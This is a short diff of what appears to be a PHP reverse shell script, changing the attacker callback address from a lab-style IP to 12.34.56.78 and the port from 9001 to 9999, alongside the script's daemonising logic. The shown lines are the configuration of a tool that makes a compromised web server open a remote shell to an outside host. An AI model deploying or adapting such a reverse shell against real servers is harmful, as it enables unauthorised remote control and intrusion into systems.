@@ -2,8 +2,8 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '10.10.16.69';  // CHANGE THIS
-$port = 9001;       // CHANGE THIS
+$ip = '12.34.56.78';  // CHANGE THIS
+$port = 9999;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
@@ -33,7 +33,6 @@ if (function_exists('pcntl_fork')) {
 } else {
 	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
 }
-
 
 chdir("/");
 
